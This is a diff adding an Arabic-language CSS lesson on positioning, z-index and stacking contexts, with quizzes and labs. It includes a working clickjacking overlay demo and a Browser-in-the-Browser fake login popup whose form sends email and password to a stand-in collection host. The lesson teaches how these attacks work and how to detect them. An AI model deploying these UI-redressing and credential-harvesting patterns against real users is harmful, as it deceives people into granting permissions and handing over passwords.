@@ -1,0 +1,277 @@
+      <section class="section" id="c25" data-part="الجزء 2 · CSS" data-pk="css" data-nav="الـ Positioning والطبقات" data-icon="📌" data-keywords="position static relative absolute fixed sticky inset top left z-index stacking context isolation opacity transform containing block pointer-events overlay modal clickjacking ui redressing browser in the browser bitb fake popup">
+        <div class="section-head">
+          <span class="section-index">25</span>
+          <div>
+            <p class="eyebrow">CSS · الدرس 25</p>
+            <h2>الـ Positioning والطبقات (z-index)… والخداع البصري</h2>
+            <p class="lede"><code>position</code> بيطلّع العنصر من «سيل» الصفحة العادي ويخليك تحطه في أي مكان: header لازق فوق، badge في ركن كارت، نافذة منبثقة. و<code>z-index</code> بيقرر مين فوق مين. نفس الأدوات دي هي سلاح الـ <b>UI redressing</b>: طبقة فوق طبقة عشان المستخدم يشوف حاجة ويدوس على حاجة تانية — أو يشوف «نافذة login» مرسومة بالكامل بـ CSS.</p>
+          </div>
+        </div>
+
+        <h3 class="sub">قيم الـ position</h3>
+        <div class="table-wrap reveal"><table class="ref">
+          <thead><tr><th>القيمة</th><th>بياخد مكان في الصفحة؟</th><th>بيتحسب من…</th><th>استخدام</th></tr></thead>
+          <tbody>
+            <tr><td><code>static</code> (الافتراضي)</td><td class="t-ok">أيوه</td><td>— (<code>top/left</code> مالهمش تأثير)</td><td></td></tr>
+            <tr><td><code>relative</code></td><td class="t-ok">أيوه (مكانه الأصلي محجوز)</td><td>مكانه الطبيعي</td><td>إزاحة صغيرة، و«مرجع» للـ absolute اللي جواه</td></tr>
+            <tr><td><code>absolute</code></td><td class="t-no">لأ</td><td>أقرب أب <b>positioned</b> (مش static)</td><td>badges، tooltips، أيقونات جوه input</td></tr>
+            <tr><td><code>fixed</code></td><td class="t-no">لأ</td><td>الشاشة (viewport)</td><td>زرار «لفوق»، modals، chat widgets</td></tr>
+            <tr><td><code>sticky</code></td><td class="t-ok">أيوه</td><td>بيلزق لما توصل الـ scroll لـ <code>top</code></td><td>headers، عناوين جداول</td></tr>
+          </tbody>
+        </table></div>
+        <html-example file="positions.html" auto max="300">
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+            <meta charset="UTF-8">
+            <title>Positions</title>
+            <style>
+              body { margin: 0; font-family: system-ui, sans-serif; height: 520px; }
+              header { position: sticky; top: 0; background: #0b1322; color: #fff; padding: 8px 12px; z-index: 10; }
+              .card { position: relative; margin: 14px; padding: 16px; border: 1px solid #cbd5e1; border-radius: 12px; width: 240px; }
+              .badge { position: absolute; top: -8px; right: -8px; background: #dc2626; color: #fff; border-radius: 99px; padding: 1px 8px; font-size: 12px; }
+              .nudge { position: relative; left: 20px; color: #c2410c; }
+              .fab { position: fixed; right: 12px; bottom: 12px; border-radius: 50%; width: 40px; height: 40px; border: 0; background: #ff7a45; color: #fff; }
+            </style>
+          </head>
+          <body>
+            <header>sticky header — scroll inside the preview</header>
+            <div class="card">Card (relative) <span class="badge">3 new</span></div>
+            <p class="nudge">relative: shifted 20px, its original space stays</p>
+            <button class="fab" aria-label="Back to top">↑</button>
+          </body>
+          </html>
+        </html-example>
+        <p><code>inset: 0</code> = <code>top: 0; right: 0; bottom: 0; left: 0</code> — طبقة بتغطي كل مساحة المرجع بتاعها (overlay).</p>
+        <div class="callout warn reveal"><span class="ci">⚠️</span><div><strong>fixed مش دايمًا «fixed»</strong><p>لو أي أب عليه <code>transform</code> أو <code>filter</code> أو <code>perspective</code> أو <code>contain</code>، العنصر الـ <code>fixed</code> بيتحسب من الأب ده بدل الشاشة. bug شائع جدًا في الـ modals جوه عناصر عليها animation.</p></div></div>
+
+        <h3 class="sub">z-index والـ stacking contexts</h3>
+        <p><code>z-index</code> بيشتغل على العناصر الـ positioned (وكمان عناصر flex/grid). الأكبر فوق. بس فيه فخ كبير: بعض الخصائص بتعمل <b>stacking context</b> — «علبة» مقفولة: كل اللي جواها بيترتب جواها بس، والعلبة كلها بتتعامل كطبقة واحدة. أي حاجة من دول بتعمل علبة: <code>position</code> + <code>z-index</code>، <code>opacity</code> أقل من 1، <code>transform</code>، <code>filter</code>، <code>isolation: isolate</code>، وغيرهم.</p>
+        <html-example file="stacking.html" auto>
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+            <meta charset="UTF-8">
+            <title>Stacking contexts</title>
+            <style>
+              body { font-family: system-ui, sans-serif; position: relative; height: 160px; }
+              .box { position: absolute; width: 170px; height: 90px; padding: 6px; color: #fff; border-radius: 10px; }
+              .a { left: 10px; top: 10px; background: #2563eb; z-index: 1; }
+              .a-child { position: absolute; left: 110px; top: 40px; width: 150px; padding: 6px; background: #f59e0b; color: #111; z-index: 9999; border-radius: 8px; }
+              .b { left: 150px; top: 50px; background: #dc2626; z-index: 2; }
+            </style>
+          </head>
+          <body>
+            <div class="box a">.a (z-index: 1)<div class="a-child">.a-child z-index: 9999</div></div>
+            <div class="box b">.b (z-index: 2)</div>
+          </body>
+          </html>
+        </html-example>
+        <p>الـ <code>.a-child</code> عليه <code>9999</code> ومع ذلك تحت <code>.b</code>: لأنه محبوس جوه علبة <code>.a</code> (وزنها 1)، والعلبة كلها تحت <code>.b</code> (وزنها 2). كل «<code>z-index: 99999</code> مش شغّال!» سببها كده.</p>
+
+        <h3 class="sub">pointer-events: الضغطة رايحة فين؟</h3>
+        <p><code>pointer-events: none</code> بيخلي العنصر «شفاف» للماوس: الضغطة بتعدّي من خلاله للي تحته. مفيد لـ overlays زخرفية… وخطير:</p>
+        <html-example file="pointer-events.html" auto url="https://evil.example/quiz.html" max="300">
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+            <meta charset="UTF-8">
+            <title>pointer-events</title>
+            <style>
+              body { font-family: system-ui, sans-serif; }
+              .stage { position: relative; width: 320px; height: 140px; }
+              iframe { position: absolute; inset: 0; width: 320px; height: 140px; border: 0; }
+              .fake { position: absolute; inset: 0; pointer-events: none; background: #f0fdf4; border-radius: 10px;
+                      display: grid; place-items: center; opacity: .9; }
+              .fake b { background: #16a34a; color: #fff; padding: 8px 18px; border-radius: 8px; }
+            </style>
+          </head>
+          <body>
+            <div class="stage">
+              <iframe title="target" srcdoc="<body style='margin:0;font-family:system-ui;display:grid;place-items:center;height:140px'><button onclick='document.body.innerHTML=&quot;<h3 style=color:#dc2626>⚠ Permission granted!</h3>&quot;' style='padding:8px 18px'>Allow camera</button></body>"></iframe>
+              <div class="fake"><b>▶ Play video</b></div>
+            </div>
+            <p>The visible «Play» is on top, but it has <code>pointer-events: none</code> — the click goes to the real button below.</p>
+          </body>
+          </html>
+        </html-example>
+        <div class="callout pt reveal"><span class="ci">🎯</span><div><strong>نسختين من الـ clickjacking</strong><p>(1) الكلاسيكية: الـ target (iframe) <b>فوق</b> وشفاف (<code>opacity: 0</code>) والطُعم تحت. (2) المقلوبة: الطُعم <b>فوق</b> ومرسوم كويس بس عليه <code>pointer-events: none</code>، والـ target تحت هو اللي بيستقبل الضغطة. التانية بتعدّي بعض الحمايات اللي بتدوّر على iframes شفافة. الدفاع واحد: <code>frame-ancestors</code>. وفيه متغيرات زي «double-clickjacking» بتلعب بتوقيت الضغطتين — الـ CSS والتوقيت مع بعض.</p></div></div>
+
+        <h3 class="sub">🦠 Browser-in-the-Browser: نافذة مزيفة بالكامل</h3>
+        <p>زرار «Sign in with …» بيفتح popup فيه شريط عنوان بيبيّن دومين موثوق. في هجمة <b>Browser-in-the-Browser (BitB)</b> اللي اتنشرت في 2022، الـ «popup» ده <b>div</b> مرسوم بـ CSS: شريط عنوان مزيف، أزرار نافذة مزيفة، و<code>position: fixed</code> + <code>z-index</code> عالي — جوه نفس صفحة المهاجم:</p>
+        <html-example file="bitb.html" auto url="https://free-tools.example/" max="340">
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+            <meta charset="UTF-8">
+            <title>BitB demo</title>
+            <style>
+              body { margin: 0; font-family: system-ui, sans-serif; background: #f1f5f9; height: 320px; }
+              .win { position: fixed; top: 20px; left: 50%; translate: -50% 0; width: 330px; z-index: 2147483647;
+                     background: #fff; border-radius: 10px; box-shadow: 0 25px 50px -12px rgb(0 0 0 / 45%); overflow: hidden; }
+              .bar { display: flex; align-items: center; gap: 6px; padding: 7px 10px; background: #e5e7eb; font-size: 12px; }
+              .dots i { display: inline-block; width: 10px; height: 10px; border-radius: 50%; background: #f87171; margin-right: 4px; }
+              .url { flex: 1; background: #fff; border-radius: 6px; padding: 2px 8px; color: #166534; }
+              .body { padding: 14px 16px; }
+              input, button { width: 100%; margin: 4px 0; padding: 7px; }
+            </style>
+          </head>
+          <body>
+            <p style="padding:10px">Free PDF tools — <button>Sign in with ExampleID</button></p>
+            <div class="win" role="dialog" aria-label="Fake popup">
+              <div class="bar"><span class="dots"><i></i><i></i><i></i></span><span class="url">🔒 https://id.example/login</span></div>
+              <div class="body"><b>Sign in to ExampleID</b>
+                <form action="https://collect.free-tools.example/c" method="post"><input name="u" placeholder="email"><input name="p" type="password" placeholder="password"><button>Next</button></form>
+              </div>
+            </div>
+          </body>
+          </html>
+        </html-example>
+        <div class="callout def reveal"><span class="ci">🛡️</span><div><strong>إزاي تكشف نافذة مزيفة</strong><p>حاول تسحب «النافذة» برا حدود الصفحة: النافذة الحقيقية بتطلع برا المتصفح، المزيفة لأ (محبوسة جوه الصفحة). وشريط العنوان المزيف مبيتغيّرش لو كتبت فيه، ومدير الـ passwords مش بيقترح الـ password لأنه شايف الدومين الحقيقي (<code>free-tools.example</code>). المصادقة بـ passkeys/FIDO2 بتمنع الـ phishing ده من أساسه.</p></div></div>
+
+        <div class="exercises">
+          <div class="exercises-head"><h3><span class="bulb">✏️</span> تمارين الدرس 25</h3></div>
+          <quiz id="c25-q1" answer="2">
+            <q>عنصر `position: absolute; top: 0; right: 0`. هيتحط في ركن مين؟</q>
+            <o>الصفحة دايمًا</o>
+            <o>أبوه المباشر دايمًا</o>
+            <o>أقرب أب ليه `position` غير static (ولو مفيش: الـ initial containing block)</o>
+            <o>الشاشة</o>
+            <good>عشان كده بنحط `position: relative` على الكارت: يبقى هو المرجع للـ badge.</good>
+            <bad>الـ absolute بيدوّر على أقرب أب «positioned». لو الأب static، بيعدّيه ويطلع لفوق.</bad>
+          </quiz>
+          <quiz id="c25-q2" answer="0">
+            <q>modal عليه `z-index: 99999` وبرضه تحت header عليه `z-index: 10`. السبب الأرجح؟</q>
+            <o>الـ modal جوه عنصر عامل stacking context (مثلًا عليه `transform` أو `opacity` أو z-index أقل) فمحبوس جواه</o>
+            <o>الرقم كبير زيادة</o>
+            <o>z-index مش بيشتغل مع fixed</o>
+            <o>الـ header لازم يبقى static</o>
+            <good>z-index بيتقارن بين العلب اللي في نفس المستوى. الحل: انقل الـ modal لآخر الـ body (أو استخدم `<dialog>` بـ top layer).</good>
+            <bad>الأرقام بتتقارن جوه نفس الـ stacking context بس. لو أبو الـ modal علبته تحت الـ header، كل اللي جواها تحت.</bad>
+          </quiz>
+          <quiz id="c25-q3" answer="3">
+            <q>صورة زخرفية فوق زرار وعليها `pointer-events: none`. المستخدم داس على الصورة. هيحصل إيه؟</q>
+            <o>ولا حاجة</o>
+            <o>الصورة هتستقبل الضغطة</o>
+            <o>الضغطة هتتلغي</o>
+            <o>الضغطة هتعدّي للزرار اللي تحت</o>
+            <good>ده مفيد لـ overlays — وخطير في الـ clickjacking المقلوب.</good>
+            <bad>`pointer-events: none` = العنصر مش موجود بالنسبة للماوس، فالـ hit-testing بيعدّي للي تحته.</bad>
+          </quiz>
+          <quiz id="c25-q4" answer="1">
+            <q>«popup» للـ login فيه شريط عنوان مكتوب فيه دومين موثوق. إزاي تتأكد بسرعة إنه مش BitB؟</q>
+            <o>تتأكد إن فيه قفل أخضر</o>
+            <o>تحاول تسحب النافذة برا حدود صفحة المتصفح — المزيفة مش هتعرف تخرج</o>
+            <o>تقرا الدومين المكتوب</o>
+            <o>تدوس على X</o>
+            <good>القفل والدومين المكتوبين ممكن يترسموا بـ CSS. الحدود الفيزيكية للنافذة هي اللي مينفعش تتزيف.</good>
+            <bad>أي حاجة جوه الـ «نافذة» (قفل، دومين، أزرار) ممكن تبقى HTML/CSS. اختبر سلوك النافذة نفسها.</bad>
+          </quiz>
+
+          <html-lab id="c25-lab1" title="Header لازق وbadge في الركن" level="1">
+            <desc><ul><li><code>header</code> يلزق فوق وانت بتعمل scroll (<code>sticky</code> و<code>top: 0</code>).</li>
+            <li><code>.card</code> هو المرجع للـ badge (<code>position: relative</code>).</li>
+            <li><code>.badge</code> في الركن اللي فوق على اليمين: <code>absolute</code> و<code>top: 8px</code> و<code>right: 8px</code>.</li></ul></desc>
+            <starter>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head>
+                <meta charset="UTF-8">
+                <title>Dashboard</title>
+                <style>
+                  body { margin: 0; font-family: system-ui; height: 600px; }
+                  header { background: #0b1322; color: #fff; padding: 10px; }
+                  .card { margin: 16px; padding: 24px 16px; border: 1px solid #cbd5e1; border-radius: 12px; }
+                  .badge { background: #dc2626; color: #fff; border-radius: 99px; padding: 1px 8px; }
+                </style>
+              </head>
+              <body>
+                <header>Findings dashboard</header>
+                <div class="card">Open findings <span class="badge">7</span></div>
+              </body>
+              </html>
+            </starter>
+            <solution>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head>
+                <meta charset="UTF-8">
+                <title>Dashboard</title>
+                <style>
+                  body { margin: 0; font-family: system-ui; height: 600px; }
+                  header { background: #0b1322; color: #fff; padding: 10px; position: sticky; top: 0; }
+                  .card { margin: 16px; padding: 24px 16px; border: 1px solid #cbd5e1; border-radius: 12px; position: relative; }
+                  .badge { background: #dc2626; color: #fff; border-radius: 99px; padding: 1px 8px; position: absolute; top: 8px; right: 8px; }
+                </style>
+              </head>
+              <body>
+                <header>Findings dashboard</header>
+                <div class="card">Open findings <span class="badge">7</span></div>
+              </body>
+              </html>
+            </solution>
+            <test label="header: sticky + top 0" live>(() => { const s = getComputedStyle(document.querySelector("header")); return s.position === "sticky" && s.top === "0px"; })()</test>
+            <test label=".card: relative" live>getComputedStyle(document.querySelector(".card")).position === "relative"</test>
+            <test label="الـ badge في الركن اللي فوق يمين الكارت (8px)" live>(() => { const c = document.querySelector(".card").getBoundingClientRect(), b = document.querySelector(".badge").getBoundingClientRect(), s = getComputedStyle(document.querySelector(".badge")); return s.position === "absolute" && Math.abs((b.top - c.top) - 9) < 1.5 && Math.abs((c.right - b.right) - 9) < 1.5; })()</test>
+            <hint>المسافة من حافة الكارت الخارجية = 8px + 1px border. والـ absolute محتاج أب `relative`.</hint>
+          </html-lab>
+
+          <html-lab id="c25-lab2" title="Overlay لـ modal" level="2">
+            <desc><ul><li><code>.overlay</code> بيغطي الشاشة كلها: <code>position: fixed</code> و<code>inset: 0</code>، خلفيته <code>rgb(0 0 0 / 50%)</code>، و<code>z-index: 1000</code>.</li>
+            <li><code>.modal</code> جواه متوسّط أفقيًا ورأسيًا (أي طريقة — مثلًا <code>display: grid; place-items: center</code> على الـ overlay).</li></ul></desc>
+            <starter>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head>
+                <meta charset="UTF-8">
+                <title>Modal</title>
+                <style>
+                  body { margin: 0; font-family: system-ui; height: 400px; }
+                  .modal { background: #fff; padding: 16px; border-radius: 12px; width: 220px; }
+                </style>
+              </head>
+              <body>
+                <p>Page content…</p>
+                <div class="overlay"><div class="modal">Delete this finding?</div></div>
+              </body>
+              </html>
+            </starter>
+            <solution>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head>
+                <meta charset="UTF-8">
+                <title>Modal</title>
+                <style>
+                  body { margin: 0; font-family: system-ui; height: 400px; }
+                  .overlay { position: fixed; inset: 0; background: rgb(0 0 0 / 50%); z-index: 1000; display: grid; place-items: center; }
+                  .modal { background: #fff; padding: 16px; border-radius: 12px; width: 220px; }
+                </style>
+              </head>
+              <body>
+                <p>Page content…</p>
+                <div class="overlay"><div class="modal">Delete this finding?</div></div>
+              </body>
+              </html>
+            </solution>
+            <test label="overlay: fixed ويغطي الشاشة" live>(() => { const o = document.querySelector(".overlay"), r = o.getBoundingClientRect(); return getComputedStyle(o).position === "fixed" && r.left === 0 && r.top === 0 && Math.round(r.width) === document.documentElement.clientWidth && Math.round(r.height) === innerHeight; })()</test>
+            <test label="خلفية سودا 50% و z-index 1000" live>(() => { const s = getComputedStyle(document.querySelector(".overlay")); return s.backgroundColor === "rgba(0, 0, 0, 0.5)" && s.zIndex === "1000"; })()</test>
+            <test label="الـ modal متوسّط" live>(() => { const m = document.querySelector(".modal").getBoundingClientRect(); return Math.abs(m.left - (document.documentElement.clientWidth - m.right)) < 2 && Math.abs(m.top - (innerHeight - m.bottom)) < 2; })()</test>
+          </html-lab>
+
+          <task id="c25-t1" title="مين فوق؟" level="2" answer="b|.b" reject="a-child|.a-child|a|.a">
+            <desc><p>في المنطقة اللي الـ 3 عناصر متداخلين فيها، أنهي عنصر هيبان <b>فوق</b>؟ (اكتب اسم الـ class)</p></desc>
+            <listing lang="html" file="layers.html">
+              <style>
+                .a { position: relative; z-index: 1; }
+                .a-child { position: absolute; z-index: 9999; }
+                .b { position: relative; z-index: 2; }
+              </style>
+              <div class="a"><div class="a-child">child</div></div>
+              <div class="b">b</div>
+            </listing>
+            <explain>`b`. الـ `.a` عامل stacking context (relative + z-index)، فالـ `.a-child` بـ 9999 محبوس جواه. على مستوى الصفحة المقارنة بين `.a` (1) و`.b` (2) ⇒ `.b` فوق كل محتوى `.a`.</explain>
+            <check expr="document.elementFromPoint(80, 60).className"><style>body { margin: 0; } div { width: 100px; height: 100px; } .a { position: relative; z-index: 1; background: blue; } .a-child { position: absolute; z-index: 9999; left: 50px; top: 50px; background: orange; } .b { position: relative; z-index: 2; margin: -50px 0 0 60px; background: red; }</style><div class="a"><div class="a-child"></div></div><div class="b"></div></check>
+          </task>
+        </div>
+      </section>
